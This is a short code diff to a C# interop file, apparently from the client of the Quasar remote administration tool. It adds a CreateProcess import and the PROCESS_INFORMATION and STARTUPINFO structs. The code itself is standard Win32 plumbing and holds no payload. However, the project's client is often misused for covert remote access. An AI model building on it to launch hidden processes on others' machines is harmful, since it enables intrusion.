@@ -53,6 +53,9 @@ namespace Quasar.Client.Utilities
         [DllImport("kernel32.dll", SetLastError = true)]
         internal static extern bool QueryFullProcessImageName([In] IntPtr hProcess, [In] uint dwFlags, [Out] StringBuilder lpExeName, [In, Out] ref uint lpdwSize);
 
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref NativeMethods.STARTUPINFO lpStartupInfo, out NativeMethods.PROCESS_INFORMATION lpProcessInformation);
+
         /// <summary>
         ///    Performs a bit-block transfer of the color data corresponding to a
         ///    rectangle of pixels from the specified source device context into
@@ -148,6 +151,36 @@ namespace Quasar.Client.Utilities
             public uint uMsg;
             public ushort wParamL;
             public ushort wParamH;
+        }
+
+        public struct PROCESS_INFORMATION
+        {
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public int dwProcessId;
+            public int dwThreadId;
+        }
+
+        public struct STARTUPINFO
+        {
+            public uint cb;
+            public string lpReserved;
+            public string lpDesktop;
+            public string lpTitle;
+            public uint dwX;
+            public uint dwY;
+            public uint dwXSize;
+            public uint dwYSize;
+            public uint dwXCountChars;
+            public uint dwYCountChars;
+            public uint dwFillAttribute;
+            public uint dwFlags;
+            public ushort wShowWindow;
+            public ushort cbReserved2;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput;
+            public IntPtr hStdOutput;
+            public IntPtr hStdError;
         }
 
         [DllImport("user32.dll")]
